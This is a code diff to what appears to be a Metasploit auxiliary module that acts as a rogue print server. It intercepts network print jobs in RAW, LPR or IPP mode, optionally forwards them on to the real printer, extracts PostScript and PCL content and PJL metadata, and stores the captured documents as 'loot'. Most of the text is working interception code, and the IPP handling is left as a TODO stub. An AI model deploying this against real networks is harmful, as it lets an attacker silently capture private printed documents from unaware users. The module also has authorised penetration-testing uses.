@@ -51,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
             OptPort.new('RPORT',        [ false, 'Forward to remote port', 9100 ]),
             OptAddress.new('RHOST',     [ false, 'Forward to remote host' ]),
             OptBool.new('METADATA',     [ true, 'Display Metadata from printjobs', true ]),
-            OptString.new('MODE',     [ true, 'RAW or LPR', 'RAW' ]),
+            OptString.new('MODE',     [ true, 'RAW, LPR or IPP', 'RAW' ]),
 
         ], self.class)
 
@@ -70,10 +70,11 @@ class Metasploit3 < Msf::Auxiliary
 
             @srvhost = datastore['SRVHOST']
             @srvport = datastore['SRVPORT'] || 9100
+            @mode = datastore['MODE'].upcase || 'RAW'
+            print_status("#{name}: Starting Print Server on %s:%s - %s mode" % [@srvhost, @srvport, @mode])
 
             if datastore['FORWARD']
                 @forward = datastore['FORWARD']
-                @mode = datastore['MODE'].upcase || 'RAW'
                 @rport = datastore['RPORT'] || 9100
                 if not datastore['RHOST'].nil?
                     @rhost = datastore['RHOST']
@@ -82,10 +83,11 @@ class Metasploit3 < Msf::Auxiliary
                     raise ArgumentError, "#{name}: Cannot forward without a valid RHOST"
                 end
             end
+            if not @mode == 'RAW' and not @forward
+                raise ArgumentError, "#{name}: Cannot intercept LPR/IPP without a forwarding target"
+            end
             @metadata = datastore['METADATA']
             @verbose = datastore['VERBOSE']
-
-            print_status("#{name}: Starting Print Server on %s:%s - %s mode" % [@srvhost, @srvport, @mode])
 
             exploit()
 
@@ -98,18 +100,19 @@ class Metasploit3 < Msf::Auxiliary
         @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
         print_status("#{name}: Client connection from #{c.peerhost}:#{c.peerport}")
         @data = ''
+        @raw_data = ''
     end
 
     def on_client_data(c)
         curr_data = c.get_once
         @data << curr_data
         if @mode == 'RAW'
-            # RAW Mode
-        elsif @mode == 'LPR' or @mode == 'LPD'
+            # RAW Mode - no further actions
+        elsif @mode == 'LPR' or @mode == 'IPP'
             response = stream_data(curr_data)
             c.put(response)
         else
-            raise ArgumentError, "Mode set incorrectly - please use RAW or LPR"
+            raise ArgumentError, "Mode set incorrectly - please use RAW, LPR or IPP"
         end
 
         if (Rex::Text.to_hex(curr_data.first)) == '\x02' and (Rex::Text.to_hex(curr_data.last)) == '\x0a'
@@ -123,14 +126,24 @@ class Metasploit3 < Msf::Auxiliary
         print_status("#{name}: Client #{c.peerhost}:#{c.peerport} closed connection after %d bytes of data" % @data.length)
         sock.close if sock
 
+        # forward RAW data as it's not streamed
+        if @forward and @mode == 'RAW'
+            forward_data(@data)
+        end
+
         @prn_src = c.peerhost
         @prn_title, @prn_type = ''
         @prn_metadata = {}
         @meta_output = []
 
+        #extract print data and Metadata from @data
         begin
             if @data.include?("%!PS-Adobe")
                 @prn_type = "Postscript"
+                # extract PostScript data
+                @raw_data = @data.scan(/%!PS-Adobe.*%%EOF/im).first
+
+                # extract Postsript Metadata
                 @prn_metadata = @data.scan(/^%%(.*)$/i)
                 print_good("#{name}: Printjob intercepted - type #{@prn_type}")
                 @prn_metadata.each do | meta |
@@ -142,8 +155,12 @@ class Metasploit3 < Msf::Auxiliary
                     end
                 end
 
-            elsif @data.include?("LANGUAGE=PCL") or @data.include?("LANGUAGE=PCLXL")
+            elsif Rex::Text.to_hex(@data).include?('\x1b\x45\x1b\x26')
                 @prn_type = "PCL"
+                # extract everything between PCL start and end markers
+                @raw_data = @data.unpack("H*")[0].scan(/1b451b26.*0c1b45/i).pack("H*")
+
+                # extract PJL Metadata
                 @prn_metadata = @data.scan(/^@PJL\s(JOB=|SET\s|COMMENT\s)(.*)$/i)
                 print_good("#{name}: Printjob intercepted - type #{@prn_type}")
                 @prn_metadata.each do | meta |
@@ -159,23 +176,31 @@ class Metasploit3 < Msf::Auxiliary
                         @prn_title = meta[1].strip
                     end
                 end
+
+            # TODO: INSERT IPP SPECIFIC CODE
+            #elsif IPP
+
             else
-                # OTHER
+                print_error("#{name}: Unable to detect printjob type, dumping complete output")
+                @prn_type = "Unknown Type"
             end
 
+            # output discovered Metadata if set
             if @meta_output and @metadata
                 @meta_output.sort.each do | out |
                     print_status("#{out}")
                 end
             end
+
+            # set name to unknown if not discovered via Metadata
             @prn_title = 'Unnamed' if not @prn_title
-            storefile if not @data.empty?
 
-            if @forward and @mode == 'RAW'
-                forward_data(@data)
-            end
+            #store loot
+            storefile if not @raw_data.empty?
 
-            @data = '' # clear data
+            # clear data and state
+            @data = ''
+            @raw_data = ''
             @state.delete(c)
 
         rescue  =>  ex
@@ -202,14 +227,17 @@ class Metasploit3 < Msf::Auxiliary
 
     def storefile
         # store the file
-        if @data
+
+        # TODO: SORT LOOT FILENAME TO BE PS OR PCL FILE
+
+        if @raw_data
             loot = store_loot(
                     "prn_snarf",
                     @prn_type,
                     @prn_src,
-                    @data,
+                    @raw_data,
                     @prn_title,
-                    "PrintJob Snarfer"
+                    "PrintJob capture"
                     )
             print_good("Incoming printjob - %s saved to loot" % @prn_title)
             print_good("Loot filename: %s" % loot)
